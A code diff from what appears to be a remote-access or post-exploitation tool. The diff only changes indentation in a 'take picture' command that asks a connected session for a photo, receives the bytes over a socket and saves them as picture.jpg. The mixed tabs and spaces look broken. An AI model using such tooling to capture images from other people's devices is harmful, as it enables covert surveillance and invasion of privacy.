@@ -38,29 +38,29 @@ class command:
 		dest = cmd_data['args'][0]
                 if os.path.isdir(dest):
                     if os.path.exists(dest):
-			 h.info_general("Taking picture...")
-			 response = json.loads(session.send_command(cmd_data))
-			 try:
-		    	     success = response["status"]
-		             if success == 1:
-		                 size = int(response["size"])
-			         data = session.sock_receive_data(size)
-			         f = open(os.path.join(dest,'picture.jpg'),'w')
-			         f.write(data)
-			         f.close()
-		         except:
-		             h.info_error("Failed to take picture!")
-			     g = os.environ['HOME']
-        		     os.chdir(g + "/mouse")
-			     return
-                         if dest[-1:] == "/":
-                             h.info_general("Saving to "+dest+"picture.jpg...")
-                             time.sleep(1)
-                             h.info_success("Saved to "+dest+"picture.jpg!")
-                         else:
-                             h.info_general("Saving to "+dest+"/picture.jpg...")
-                             time.sleep(1)
-                             h.info_success("Saved to "+dest+"/picture.jpg!")
+			h.info_general("Taking picture...")
+		        response = json.loads(session.send_command(cmd_data))
+			try:
+		    	    success = response["status"]
+		            if success == 1:
+		                size = int(response["size"])
+			        data = session.sock_receive_data(size)
+			        f = open(os.path.join(dest,'picture.jpg'),'w')
+			        f.write(data)
+			        f.close()
+		        except:
+		            h.info_error("Failed to take picture!")
+			    g = os.environ['HOME']
+        		    os.chdir(g + "/mouse")
+			    return
+                        if dest[-1:] == "/":
+                            h.info_general("Saving to "+dest+"picture.jpg...")
+                            time.sleep(1)
+                            h.info_success("Saved to "+dest+"picture.jpg!")
+                        else:
+                            h.info_general("Saving to "+dest+"/picture.jpg...")
+                            time.sleep(1)
+                            h.info_success("Saved to "+dest+"/picture.jpg!")
                     else:
                         h.info_error("Local directory: "+dest+": does not exist!")
                 else:
